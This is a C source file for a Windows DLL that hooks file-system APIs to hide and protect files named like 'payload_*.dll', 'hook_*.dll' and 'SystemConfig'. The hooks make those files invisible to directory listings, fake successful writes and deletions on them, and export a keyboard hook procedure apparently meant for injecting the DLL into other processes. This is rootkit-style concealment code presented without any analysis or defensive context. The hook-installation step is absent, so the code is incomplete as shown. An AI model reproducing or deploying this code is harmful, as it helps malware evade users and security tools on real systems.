#include <windows.h>
#include <string.h>
#include <winternl.h>

#define STATUS_OBJECT_NAME_NOT_FOUND ((LONG)0xC0000034L)

typedef HANDLE (WINAPI *CreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *DeleteFileA_t)(LPCSTR);
typedef LONG (NTAPI *NtCreateFile_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef HANDLE (WINAPI *FindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL (WINAPI *FindNextFileA_t)(HANDLE, LPWIN32_FIND_DATAA);

HMODULE hKernel32, hNtdll;
CreateFileA_t origCreateFileA;
WriteFile_t origWriteFile;
DeleteFileA_t origDeleteFileA;
NtCreateFile_t origNtCreateFile;
FindFirstFileA_t origFindFirstFileA;
FindNextFileA_t origFindNextFileA;
char exe_name[MAX_PATH];

__declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL ShouldHideFile(const char *fileName) {
    // Hide files matching exe_name, hidden folders (starting with "."), SystemConfig, payload_*.dll, and hook_*.dll
    return (strstr(fileName, exe_name) ||
            fileName[0] == '.' ||
            strstr(fileName, "SystemConfig") ||
            (strstr(fileName, "payload_") && strstr(fileName, ".dll")) ||
            (strstr(fileName, "hook_") && strstr(fileName, ".dll")));
}

HANDLE WINAPI HookedCreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile) {
    if (ShouldHideFile(lpFileName)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE;
    }
    return origCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

BOOL WINAPI HookedWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
    char fileName[MAX_PATH];
    if (GetFinalPathNameByHandleA(hFile, fileName, MAX_PATH, 0) > 0) {
        if (ShouldHideFile(fileName)) {
            *lpNumberOfBytesWritten = nNumberOfBytesToWrite;
            return TRUE;
        }
    }
    return origWriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

BOOL WINAPI HookedDeleteFileA(LPCSTR lpFileName) {
    if (ShouldHideFile(lpFileName)) {
        return TRUE;
    }
    return origDeleteFileA(lpFileName);
}

LONG NTAPI HookedNtCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess,
    ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength) {
    if (ObjectAttributes != NULL && ObjectAttributes->ObjectName != NULL) {
        UNICODE_STRING *name = ObjectAttributes->ObjectName;
        char path[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, name->Buffer, name->Length / sizeof(WCHAR), path, MAX_PATH, NULL, NULL);
        path[name->Length / sizeof(WCHAR)] = '\0';
        if (ShouldHideFile(path)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    }
    return origNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize,
        FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}

HANDLE WINAPI HookedFindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData) {
    HANDLE hFind = origFindFirstFileA(lpFileName, lpFindFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return hFind;
    }

    // Check if the first file should be hidden
    while (ShouldHideFile(lpFindFileData->cFileName)) {
        if (!origFindNextFileA(hFind, lpFindFileData)) {
            FindClose(hFind);
            SetLastError(ERROR_FILE_NOT_FOUND);
            return INVALID_HANDLE_VALUE;
        }
    }
    return hFind;
}

BOOL WINAPI HookedFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData) {
    BOOL result;
    do {
        result = origFindNextFileA(hFindFile, lpFindFileData);
        if (!result) {
            return result;
        }
    } while (ShouldHideFile(lpFindFileData->cFileName));
    return result;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Get the executable name dynamically
        char bin_path[MAX_PATH];
        GetModuleFileNameA(NULL, bin_path, MAX_PATH);
        char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
        strncpy(exe_name, bin_name, MAX_PATH);
        exe_name[MAX_PATH - 1] = '\0';

        hKernel32 = LoadLibraryA("kernel32.dll");
        hNtdll = LoadLibraryA("ntdll.dll");
        origCreateFileA = (CreateFileA_t)GetProcAddress(hKernel32, "CreateFileA");
        origWriteFile = (WriteFile_t)GetProcAddress(hKernel32, "WriteFile");
        origDeleteFileA = (DeleteFileA_t)GetProcAddress(hKernel32, "DeleteFileA");
        origNtCreateFile = (NtCreateFile_t)GetProcAddress(hNtdll, "NtCreateFile");
        origFindFirstFileA = (FindFirstFileA_t)GetProcAddress(hKernel32, "FindFirstFileA");
        origFindNextFileA = (FindNextFileA_t)GetProcAddress(hKernel32, "FindNextFileA");
    }
    return TRUE;
}